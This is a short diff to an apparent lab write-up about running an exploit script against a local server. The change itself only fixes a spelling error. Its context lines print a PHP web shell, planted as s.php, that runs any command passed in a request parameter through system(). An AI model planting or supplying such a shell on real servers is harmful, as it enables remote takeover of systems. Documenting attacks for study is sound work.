@@ -50,7 +50,7 @@ ruby /tmp/44449.rb http://localhost
 
 <img src="attack5.png" align="center"/>
 
-The exploit works by adding into the server a malicious `s.php` wich allows remote code execution on it via following malicious content: 
+The exploit works by adding into the server a malicious `s.php` which allows remote code execution on it via following malicious content: 
 
 ```php
 <?php if( isset( $_REQUEST['c'] ) ) { system( $_REQUEST['c'] . ' 2>&1' ); }
